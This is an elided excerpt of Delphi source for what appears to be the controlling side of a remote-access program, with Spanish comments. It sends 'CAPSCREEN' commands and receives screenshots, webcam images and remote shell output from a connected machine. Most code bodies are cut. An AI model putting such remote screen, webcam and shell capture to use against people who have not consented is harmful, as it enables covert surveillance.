...
//          Aux := Athread.Connection.ReadLn;
      ...
      MemoShell.Text := MemoShell.Text + Trim(Recibido) + #13#10;
...
begin
  ...
  Servidor.Connection.Writeln('CAPSCREEN' + IntToStr(TrackBarCalidad.Position));
end;
...
procedure TFormControl.BtnZoomOutClick(Sender: TObject);
begin
...
procedure TFormControl.BtnZoomInClick(Sender: TObject);
begin
...
begin
  ...
  while ProgressBarScreen.Position < 100 do
    Sleep(100);
  //Espera hasta que se haya recibido toda la captura anterior antes de pedir la siguiente
...
begin
  ...
  begin
    ...
    ObtenerScreenCap_CamCap(AThread, Size);
  ...
  begin
    ...
    imgWebcam.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'jpgcool.jpg');
  end;
end;
...
procedure TFormControl.ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64);
var
  ...
  buffSize: integer;
begin
  FilePath := ExtractFilePath(ParamStr(0)) + 'jpgcool.jpg';
...
begin
  try
    if SpinCaptureScreen.Value < 1000 then
      SpinCaptureScreen.Value := 1000;
...
begin
  ...
  case Self.CheckBoxAutoCapturaScreen.Checked of
    //Activaron el automatico, pida la primera captura y que el resto las haga el timer
    True: Servidor.Connection.Writeln('CAPSCREEN' +
